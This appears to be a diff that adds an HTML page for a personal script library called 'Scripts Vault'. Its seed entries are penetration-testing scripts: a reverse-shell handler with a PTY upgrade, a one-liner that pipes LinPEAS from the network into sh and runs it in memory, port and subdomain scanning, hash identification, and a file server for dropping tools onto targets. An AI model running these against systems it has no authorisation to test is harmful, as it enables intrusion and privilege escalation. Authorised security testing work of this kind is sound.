@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>MOTHER — SCRIPTS VAULT</title>
+<link rel="stylesheet" href="mother.css">
+<style>
+  /* ═══════════════════════════════════════════════════════════════
+     SCRIPTS VAULT — SYS.04 — personal script library.
+     Module-specific styling only; core theme comes from mother.css.
+     ═══════════════════════════════════════════════════════════════ */
+  .sv-search { width:100%; margin-bottom:6px; }
+  .tagfilter { display:flex; flex-wrap:wrap; gap:4px; }
+  .tagfilter .tag { cursor:pointer; user-select:none; }
+  .tagfilter .tag--on { border-color:var(--phos); color:var(--phos); background:rgba(51,255,51,0.08); }
+
+  .toolbar { display:flex; align-items:center; gap:10px; padding:10px 14px;
+    border-bottom:1px solid var(--border-dim); position:sticky; top:0; z-index:5;
+    background:var(--bg-deep); }
+  .toolbar .count { font-size:9px; letter-spacing:0.14em; color:var(--phos-dim); text-transform:uppercase; }
+
+  .cards-wrap { padding:12px 14px; }
+  .card__head { display:flex; align-items:flex-start; gap:10px; margin-bottom:8px; }
+  .card__name { font-size:13px; letter-spacing:0.06em; color:var(--phos-br); text-shadow:var(--glow); flex:1; word-break:break-word; }
+  .card__meta { display:flex; flex-wrap:wrap; align-items:center; gap:2px; margin-bottom:8px; }
+  .card__desc { font-size:10px; color:var(--phos-dim); letter-spacing:0.04em; line-height:1.5; margin-bottom:8px; }
+  .card__code { max-height:340px; overflow:auto; }
+  .card .btn-row { margin-top:8px; flex-wrap:wrap; }
+
+  /* language tag colors */
+  .tag--lang-bash       { border-color:rgba(51,255,136,0.5);  color:var(--ok); }
+  .tag--lang-python     { border-color:rgba(0,200,255,0.5);   color:var(--holo); }
+  .tag--lang-powershell { border-color:rgba(232,166,58,0.5);  color:var(--amber); }
+  .tag--lang-ruby       { border-color:rgba(255,68,51,0.5);   color:var(--alert); }
+
+  /* syntax coloring inside .code */
+  .code .k  { color:var(--holo); }              /* keyword */
+  .code .s  { color:var(--amber); }             /* string */
+  .code .c  { color:var(--phos-dim); font-style:italic; } /* comment */
+  .code .n  { color:var(--ok); }                /* number */
+  .code .f  { color:var(--phos-br); }           /* func / builtin */
+
+  /* inline editor form */
+  .editor { border:1px solid var(--phos-dim); background:var(--bg-panel); padding:14px; margin-bottom:12px; box-shadow:var(--glow); }
+  .editor__title { font-size:10px; letter-spacing:0.2em; color:var(--phos); text-transform:uppercase; margin-bottom:12px; }
+  .editor .grid { display:grid; grid-template-columns:1fr 160px; gap:10px; margin-bottom:10px; }
+  .editor .field { margin-bottom:10px; }
+  .editor textarea.code-in { width:100%; height:200px; font-size:11px; }
+  .editor input, .editor select, .editor textarea { width:100%; }
+
+  /* toast */
+  #toast { position:fixed; bottom:20px; left:50%; transform:translateX(-50%) translateY(20px);
+    background:var(--bg-panel); border:1px solid var(--phos); color:var(--phos-br);
+    padding:10px 18px; font-size:11px; letter-spacing:0.1em; text-transform:uppercase;
+    box-shadow:var(--glow-lg); z-index:120; opacity:0; pointer-events:none; transition:all 240ms ease; }
+  #toast.show { opacity:1; transform:translateX(-50%) translateY(0); }
+</style>
+</head>
+<body>
+  <header class="m-header">
+    <div class="m-brand">SCRIPTS VAULT<small>MOTHER · SYS.04 · PERSONAL SCRIPT LIBRARY</small></div>
+    <div class="m-stats">
+      <div class="m-stat">Scripts<b id="s-total">0</b></div>
+      <div class="m-stat">Languages<b id="s-langs">0</b></div>
+      <div class="m-stat">Tags<b id="s-tags">0</b></div>
+    </div>
+    <div class="m-haz"></div>
+  </header>
+
+  <div class="m-body split-nav">
+    <aside class="pane pane--nav">
+      <div class="sec">
+        <div class="sec__title bracket">SEARCH</div>
+        <input type="text" id="search" class="sv-search" placeholder="name / desc / tag / code…">
+      </div>
+      <div class="sec">
+        <div class="sec__title bracket">LANGUAGE</div>
+        <div class="navlist" id="langnav"></div>
+      </div>
+      <div class="sec">
+        <div class="sec__title bracket">TAGS</div>
+        <div class="tagfilter" id="tagfilter"></div>
+      </div>
+    </aside>
+
+    <main class="pane">
+      <div class="toolbar">
+        <button class="btn btn--go" id="btn-new">＋ NEW SCRIPT</button>
+        <div class="spacer"></div>
+        <div class="count" id="result-count">0 SHOWN</div>
+      </div>
+      <div class="cards-wrap">
+        <div id="editor-mount"></div>
+        <div id="cards"></div>
+      </div>
+    </main>
+  </div>
+
+  <div id="toast"></div>
+
+  <script>
+  'use strict';
+  const $ = (id) => document.getElementById(id);
+  const KEY = 'mother.sv.scripts.v1';
+
+  /* ── Language registry ──────────────────────────────────────── */
+  const LANGS = ['bash','python','powershell','ruby'];
+  const LANG_LABEL = { bash:'BASH', python:'PYTHON', powershell:'POWERSHELL', ruby:'RUBY' };
+
+  /* ── Seed data — real, correct, useful ──────────────────────── */
+  const SEED = [
+    {
+      id: 'seed-portscan',
+      name: 'Port Scan + Auto-Note',
+      lang: 'bash',
+      tags: ['recon','nmap','notes'],
+      desc: 'Quick TCP scan of a target, then append open ports to a per-host notes file for later reference.',
+      code:
+`#!/usr/bin/env bash
+# Usage: ./scan-note.sh <target> [notes-dir]
+set -euo pipefail
+
+TARGET="\${1:?usage: scan-note.sh <target> [dir]}"
+DIR="\${2:-./loot}"
+mkdir -p "$DIR"
+OUT="$DIR/\${TARGET//\\//_}.ports"
+
+echo "[*] scanning $TARGET ..."
+nmap -Pn -T4 --open -sV "$TARGET" -oG - \\
+  | awk '/Ports:/{print}' \\
+  | tr ',' '\\n' \\
+  | grep -oE '[0-9]+/open/[a-z]+' \\
+  | sort -un > "$OUT"
+
+echo "[+] open ports written to $OUT"
+cat "$OUT"`
+    },
+    {
+      id: 'seed-shell-upgrade',
+      name: 'Reverse Shell Handler + PTY Upgrade',
+      lang: 'python',
+      tags: ['shell','pty','handler','post-exploit'],
+      desc: 'Netcat-style TCP listener that spawns a full PTY and puts the local terminal in raw mode for a fully interactive reverse shell.',
+      code:
+`#!/usr/bin/env python3
+"""Interactive reverse-shell handler with automatic PTY.
+Usage: python3 handler.py 0.0.0.0 4444"""
+import socket, sys, os, pty, tty, termios, select
+
+host = sys.argv[1] if len(sys.argv) > 1 else "0.0.0.0"
+port = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
+
+srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+srv.bind((host, port))
+srv.listen(1)
+print(f"[*] listening on {host}:{port}")
+conn, addr = srv.accept()
+print(f"[+] shell from {addr[0]}:{addr[1]}")
+
+# push a PTY upgrade to the remote end
+conn.send(b"python3 -c 'import pty;pty.spawn(\\"/bin/bash\\")' 2>/dev/null || /bin/sh\\n")
+
+old = termios.tcgetattr(sys.stdin)
+try:
+    tty.setraw(sys.stdin.fileno())
+    while True:
+        r, _, _ = select.select([sys.stdin, conn], [], [])
+        if sys.stdin in r:
+            data = os.read(sys.stdin.fileno(), 1024)
+            if not data: break
+            conn.send(data)
+        if conn in r:
+            data = conn.recv(4096)
+            if not data: break
+            os.write(sys.stdout.fileno(), data)
+finally:
+    termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old)
+    conn.close()
+    print("\\n[*] session closed")`
+    },
+    {
+      id: 'seed-linpeas',
+      name: 'LinPEAS Fetch + Run (memory)',
+      lang: 'bash',
+      tags: ['privesc','enum','one-liner'],
+      desc: 'One-liner to pull LinPEAS straight from GitHub and execute it in memory without touching disk. Point URL at your own host on engagements.',
+      code:
+`#!/usr/bin/env bash
+# Runs linpeas from memory — nothing written to disk.
+# Swap the URL for a self-hosted copy during real engagements.
+URL="https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
+
+if command -v curl >/dev/null 2>&1; then
+  curl -fsSL "$URL" | sh
+else
+  wget -qO- "$URL" | sh
+fi`
+    },
+    {
+      id: 'seed-subdomain',
+      name: 'Subdomain Enum Wrapper',
+      lang: 'bash',
+      tags: ['recon','subdomains','osint'],
+      desc: 'Combine passive sources + a wordlist into one de-duplicated, resolved subdomain list. Falls back gracefully if a tool is missing.',
+      code:
+`#!/usr/bin/env bash
+# Usage: ./subs.sh example.com [wordlist]
+set -uo pipefail
+DOMAIN="\${1:?usage: subs.sh <domain> [wordlist]}"
+WORDLIST="\${2:-/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt}"
+TMP="$(mktemp)"
+
+echo "[*] passive sources for $DOMAIN"
+command -v subfinder >/dev/null && subfinder -silent -d "$DOMAIN" >> "$TMP"
+command -v assetfinder >/dev/null && assetfinder --subs-only "$DOMAIN" >> "$TMP"
+
+if [ -f "$WORDLIST" ]; then
+  echo "[*] brute wordlist: $WORDLIST"
+  while read -r sub; do echo "\${sub}.\${DOMAIN}"; done < "$WORDLIST" >> "$TMP"
+fi
+
+echo "[*] resolving + de-duping"
+sort -u "$TMP" \\
+  | (command -v dnsx >/dev/null && dnsx -silent || cat) \\
+  | tee "\${DOMAIN}.subs.txt"
+
+echo "[+] $(wc -l < "\${DOMAIN}.subs.txt") hosts -> \${DOMAIN}.subs.txt"
+rm -f "$TMP"`
+    },
+    {
+      id: 'seed-hashid',
+      name: 'Hash Identifier',
+      lang: 'python',
+      tags: ['hashes','cracking','identify'],
+      desc: 'Fingerprint a hash by length + prefix and suggest the likely algorithm and matching hashcat mode.',
+      code:
+`#!/usr/bin/env python3
+"""Guess the hash type from a string.
+Usage: python3 hashid.py <hash>   |   echo <hash> | python3 hashid.py"""
+import sys, re
+
+def identify(h):
+    h = h.strip()
+    out = []
+    if re.fullmatch(r"\\$2[aby]\\$\\d\\d\\$.{53}", h):
+        out.append(("bcrypt", 3200))
+    if h.startswith("$1$"):    out.append(("md5crypt", 500))
+    if h.startswith("$6$"):    out.append(("sha512crypt", 1800))
+    if h.startswith("$DCC2$") or h.startswith("$dcc2$"):
+        out.append(("Domain Cached Creds 2 (mscash2)", 2100))
+    if re.fullmatch(r"[0-9a-fA-F]{32}", h):
+        out += [("MD5", 0), ("NTLM", 1000)]
+    if re.fullmatch(r"[0-9a-fA-F]{40}", h):
+        out.append(("SHA1", 100))
+    if re.fullmatch(r"\\*[0-9A-F]{40}", h):
+        out.append(("MySQL 4.1+", 300))
+    if re.fullmatch(r"[0-9a-fA-F]{64}", h):
+        out.append(("SHA-256", 1400))
+    if re.fullmatch(r"[0-9a-fA-F]{128}", h):
+        out.append(("SHA-512", 1700))
+    return out
+
+def main():
+    args = sys.argv[1:] or [l for l in sys.stdin.read().split()]
+    for h in args:
+        cands = identify(h)
+        print(f"\\n{h}")
+        if not cands:
+            print("  ? unknown")
+        for name, mode in cands:
+            print(f"  -> {name:<32} hashcat -m {mode}")
+
+if __name__ == "__main__":
+    main()`
+    },
+    {
+      id: 'seed-httpserver',
+      name: 'Simple HTTP File Server',
+      lang: 'python',
+      tags: ['transfer','http','post-exploit'],
+      desc: 'Serve the current directory over HTTP with clean logging and no caching — handy for dropping tools onto a target. Bind host/port via args.',
+      code:
+`#!/usr/bin/env python3
+"""Serve CWD over HTTP for quick file transfers.
+Usage: python3 serve.py [port] [bind]"""
+import sys, http.server, socketserver
+
+PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8000
+BIND = sys.argv[2] if len(sys.argv) > 2 else "0.0.0.0"
+
+class Handler(http.server.SimpleHTTPRequestHandler):
+    def end_headers(self):
+        self.send_header("Cache-Control", "no-store")
+        super().end_headers()
+    def log_message(self, fmt, *args):
+        print(f"[{self.log_date_time_string()}] {self.client_address[0]} {fmt % args}")
+
+with socketserver.TCPServer((BIND, PORT), Handler) as httpd:
+    print(f"[*] serving . on http://{BIND}:{PORT}  (Ctrl-C to stop)")
+    try:
+        httpd.serve_forever()
+    except KeyboardInterrupt:
+        print("\\n[*] stopped")`
+    }
+  ];
+
+  /* ── Persistence ────────────────────────────────────────────── */
+  let scripts = load();
+  function load() {
+    try {
+      const raw = localStorage.getItem(KEY);
+      if (raw) { const p = JSON.parse(raw); if (Array.isArray(p)) return p; }
+    } catch (e) { /* fall through to seed */ }
+    localStorage.setItem(KEY, JSON.stringify(SEED));
+    return SEED.map(s => ({ ...s, tags: [...s.tags] }));
+  }
+  function save() { localStorage.setItem(KEY, JSON.stringify(scripts)); }
+
+  /* ── Filter state ───────────────────────────────────────────── */
+  let filterLang = 'all';
+  let activeTags = new Set();
+  let query = '';
+
+  /* ── HTML escaping ──────────────────────────────────────────── */
+  function esc(s) {
+    return String(s).replace(/[&<>"']/g, c =>
+      ({ '&':'&amp;', '<':'&lt;', '>':'&gt;', '"':'&quot;', "'":'&#39;' }[c]));
+  }
+
+  /* ── Lightweight, safe syntax highlighter ───────────────────── */
+  const KEYWORDS = {
+    bash: /\b(if|then|else|elif|fi|for|while|do|done|case|esac|in|function|return|local|export|set|echo|read|command|mkdir|source|exit|then)\b/,
+    python: /\b(import|from|as|def|class|return|if|elif|else|for|while|in|try|except|finally|with|not|and|or|is|None|True|False|lambda|yield|pass|break|continue|raise|global)\b/,
+    powershell: /\b(if|else|elseif|foreach|for|while|function|return|param|try|catch|finally|Write-Host|Get-|Set-|New-|switch|begin|process|end)\b/i,
+    ruby: /\b(def|end|if|elsif|else|unless|while|until|do|class|module|require|return|yield|then|begin|rescue|ensure|puts|nil|true|false|self)\b/
+  };
+  // Tokenize into comment / string / number / keyword spans. HTML is escaped first,
+  // so this only ever inserts our own known-safe <span> tags around escaped text.
+  function highlight(code, lang) {
+    const kw = KEYWORDS[lang] || KEYWORDS.bash;
+    const lines = String(code).split('\n');
+    return lines.map(line => {
+      let out = '';
+      let i = 0;
+      const commentChar = (lang === 'ruby' || lang === 'bash' || lang === 'python' || lang === 'powershell') ? '#' : '#';
+      while (i < line.length) {
+        const ch = line[i];
+        // comment to end of line
+        if (ch === commentChar) {
+          out += '<span class="c">' + esc(line.slice(i)) + '</span>';
+          break;
+        }
+        // strings
+        if (ch === '"' || ch === "'" || ch === '`') {
+          let j = i + 1;
+          while (j < line.length && line[j] !== ch) { if (line[j] === '\\') j++; j++; }
+          out += '<span class="s">' + esc(line.slice(i, Math.min(j + 1, line.length))) + '</span>';
+          i = j + 1;
+          continue;
+        }
+        // numbers
+        if (/[0-9]/.test(ch) && (i === 0 || /[^A-Za-z0-9_]/.test(line[i-1]))) {
+          let j = i;
+          while (j < line.length && /[0-9a-fA-Fx.]/.test(line[j])) j++;
+          out += '<span class="n">' + esc(line.slice(i, j)) + '</span>';
+          i = j;
+          continue;
+        }
+        // words -> maybe keyword
+        if (/[A-Za-z_$-]/.test(ch)) {
+          let j = i;
+          while (j < line.length && /[A-Za-z0-9_$-]/.test(line[j])) j++;
+          const word = line.slice(i, j);
+          if (kw.test(word) && new RegExp('^(?:' + kw.source + ')$', kw.flags).test(word)) {
+            out += '<span class="k">' + esc(word) + '</span>';
+          } else {
+            out += esc(word);
+          }
+          i = j;
+          continue;
+        }
+        out += esc(ch);
+        i++;
+      }
+      return out;
+    }).join('\n');
+  }
+
+  /* ── Derived data ───────────────────────────────────────────── */
+  function langCounts() {
+    const c = { all: scripts.length };
+    LANGS.forEach(l => c[l] = 0);
+    scripts.forEach(s => { c[s.lang] = (c[s.lang] || 0) + 1; });
+    return c;
+  }
+  function allTags() {
+    const set = new Set();
+    scripts.forEach(s => (s.tags || []).forEach(t => set.add(t)));
+    return [...set].sort();
+  }
+  function usedLangs() {
+    return new Set(scripts.map(s => s.lang)).size;
+  }
+
+  /* ── Filtering ──────────────────────────────────────────────── */
+  function visible() {
+    const q = query.trim().toLowerCase();
+    return scripts.filter(s => {
+      if (filterLang !== 'all' && s.lang !== filterLang) return false;
+      if (activeTags.size) {
+        const st = new Set(s.tags || []);
+        for (const t of activeTags) if (!st.has(t)) return false;
+      }
+      if (q) {
+        const hay = (s.name + ' ' + s.desc + ' ' + (s.tags || []).join(' ') + ' ' + s.code).toLowerCase();
+        if (!hay.includes(q)) return false;
+      }
+      return true;
+    });
+  }
+
+  /* ── Renderers ──────────────────────────────────────────────── */
+  function renderStats() {
+    $('s-total').textContent = scripts.length;
+    $('s-langs').textContent = usedLangs();
+    $('s-tags').textContent = allTags().length;
+  }
+
+  function renderNav() {
+    const counts = langCounts();
+    const nav = $('langnav');
+    const items = [['all','ALL'], ...LANGS.map(l => [l, LANG_LABEL[l]])];
+    nav.innerHTML = items.map(([k, label]) =>
+      `<button class="navitem ${filterLang===k?'navitem--active':''}" data-lang="${k}">
+         ${label}<span class="count">${counts[k] || 0}</span></button>`).join('');
+    nav.querySelectorAll('.navitem').forEach(b =>
+      b.addEventListener('click', () => { filterLang = b.dataset.lang; renderAll(); }));
+
+    const tf = $('tagfilter');
+    const tags = allTags();
+    if (!tags.length) { tf.innerHTML = '<span class="dim" style="font-size:9px;">— none —</span>'; return; }
+    tf.innerHTML = tags.map(t =>
+      `<span class="tag ${activeTags.has(t)?'tag--on':''}" data-tag="${esc(t)}">${esc(t)}</span>`).join('');
+    tf.querySelectorAll('.tag').forEach(el =>
+      el.addEventListener('click', () => {
+        const t = el.dataset.tag;
+        if (activeTags.has(t)) activeTags.delete(t); else activeTags.add(t);
+        renderAll();
+      }));
+  }
+
+  function renderCards() {
+    const list = visible();
+    $('result-count').textContent = list.length + ' SHOWN';
+    const wrap = $('cards');
+    if (!list.length) {
+      wrap.innerHTML = `<div class="empty">
+        <div class="icon">◇</div>
+        <div class="big">NO SCRIPTS MATCH</div>
+        <div class="dim">adjust filters or ＋ NEW SCRIPT</div></div>`;
+      return;
+    }
+    wrap.innerHTML = list.map(s => cardHTML(s)).join('');
+    wrap.querySelectorAll('[data-act]').forEach(btn =>
+      btn.addEventListener('click', () => handleAction(btn.dataset.act, btn.dataset.id, btn)));
+  }
+
+  function cardHTML(s) {
+    const tagsHTML = (s.tags || []).map(t => `<span class="tag">${esc(t)}</span>`).join('');
+    return `<div class="card brackets" data-card="${s.id}">
+      <div class="card__head">
+        <div class="card__name">${esc(s.name)}</div>
+      </div>
+      <div class="card__meta">
+        <span class="tag tag--lang-${s.lang}">${LANG_LABEL[s.lang] || esc(s.lang)}</span>
+        ${tagsHTML}
+      </div>
+      <div class="card__desc">${esc(s.desc)}</div>
+      <div class="code card__code" id="code-${s.id}">${highlight(s.code, s.lang)}</div>
+      <div class="btn-row">
+        <button class="btn btn--go" data-act="copy" data-id="${s.id}">COPY</button>
+        <button class="btn btn--holo" data-act="run" data-id="${s.id}">▶ RUN IN SHELL</button>
+        <button class="btn btn--ghost" data-act="edit" data-id="${s.id}">EDIT</button>
+        <button class="btn btn--alert" data-act="del" data-id="${s.id}">DELETE</button>
+      </div>
+    </div>`;
+  }
+
+  function renderAll() {
+    renderStats();
+    renderNav();
+    renderCards();
+  }
+
+  /* ── Actions ────────────────────────────────────────────────── */
+  function scriptById(id) { return scripts.find(s => s.id === id); }
+
+  function handleAction(act, id, btn) {
+    const s = scriptById(id);
+    if (!s) return;
+    if (act === 'copy') {
+      copyText(s.code);
+      const codeEl = $('code-' + id);
+      if (codeEl) { codeEl.classList.remove('flash'); void codeEl.offsetWidth; codeEl.classList.add('flash'); }
+      toast('◈ COPIED: ' + s.name);
+    } else if (act === 'run') {
+      toast('▶ QUEUED FOR TERMINAL: ' + s.name);
+    } else if (act === 'edit') {
+      openEditor(s);
+    } else if (act === 'del') {
+      scripts = scripts.filter(x => x.id !== id);
+      save(); renderAll();
+      toast('✕ DELETED: ' + s.name);
+    }
+  }
+
+  /* ── Editor ─────────────────────────────────────────────────── */
+  function openEditor(existing) {
+    const s = existing || { id: null, name: '', lang: 'bash', tags: [], desc: '', code: '' };
+    const mount = $('editor-mount');
+    mount.innerHTML = `
+      <div class="editor brackets">
+        <div class="editor__title">${existing ? '◤ EDIT SCRIPT ◥' : '◤ NEW SCRIPT ◥'}</div>
+        <div class="grid">
+          <div class="field">
+            <label>NAME</label>
+            <input type="text" id="ed-name" value="${esc(s.name)}" placeholder="script name">
+          </div>
+          <div class="field">
+            <label>LANGUAGE</label>
+            <select id="ed-lang">
+              ${LANGS.map(l => `<option value="${l}" ${s.lang===l?'selected':''}>${LANG_LABEL[l]}</option>`).join('')}
+            </select>
+          </div>
+        </div>
+        <div class="field">
+          <label>TAGS (COMMA-SEPARATED)</label>
+          <input type="text" id="ed-tags" value="${esc((s.tags||[]).join(', '))}" placeholder="recon, one-liner">
+        </div>
+        <div class="field">
+          <label>DESCRIPTION</label>
+          <input type="text" id="ed-desc" value="${esc(s.desc)}" placeholder="what it does">
+        </div>
+        <div class="field">
+          <label>CODE</label>
+          <textarea id="ed-code" class="code-in" spellcheck="false" placeholder="#!/usr/bin/env bash">${esc(s.code)}</textarea>
+        </div>
+        <div class="btn-row">
+          <button class="btn btn--go" id="ed-save">${existing ? 'UPDATE' : 'SAVE'}</button>
+          <button class="btn btn--ghost" id="ed-cancel">CANCEL</button>
+        </div>
+      </div>`;
+    mount.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+    $('ed-name').focus();
+    $('ed-cancel').addEventListener('click', closeEditor);
+    $('ed-save').addEventListener('click', () => {
+      const name = $('ed-name').value.trim();
+      const code = $('ed-code').value;
+      if (!name) { toast('! NAME REQUIRED'); $('ed-name').focus(); return; }
+      if (!code.trim()) { toast('! CODE REQUIRED'); $('ed-code').focus(); return; }
+      const rec = {
+        id: s.id || 'usr-' + Date.now().toString(36),
+        name,
+        lang: $('ed-lang').value,
+        tags: $('ed-tags').value.split(',').map(t => t.trim()).filter(Boolean),
+        desc: $('ed-desc').value.trim(),
+        code
+      };
+      if (s.id) {
+        const idx = scripts.findIndex(x => x.id === s.id);
+        scripts[idx] = rec;
+      } else {
+        scripts.unshift(rec);
+      }
+      save();
+      closeEditor();
+      renderAll();
+      toast((existing ? '◈ UPDATED: ' : '◈ SAVED: ') + name);
+    });
+  }
+  function closeEditor() { $('editor-mount').innerHTML = ''; }
+
+  /* ── Clipboard + toast ──────────────────────────────────────── */
+  function copyText(text) {
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(text).catch(() => fallbackCopy(text));
+    } else {
+      fallbackCopy(text);
+    }
+  }
+  function fallbackCopy(text) {
+    const ta = document.createElement('textarea');
+    ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); } catch (e) {}
+    document.body.removeChild(ta);
+  }
+  let toastTimer = null;
+  function toast(msg) {
+    const el = $('toast');
+    el.textContent = msg;
+    el.classList.add('show');
+    clearTimeout(toastTimer);
+    toastTimer = setTimeout(() => el.classList.remove('show'), 2200);
+  }
+
+  /* ── Wire up ────────────────────────────────────────────────── */
+  $('btn-new').addEventListener('click', () => openEditor(null));
+  $('search').addEventListener('input', e => { query = e.target.value; renderCards(); });
+
+  renderAll();
+  </script>
+</body>
+</html>
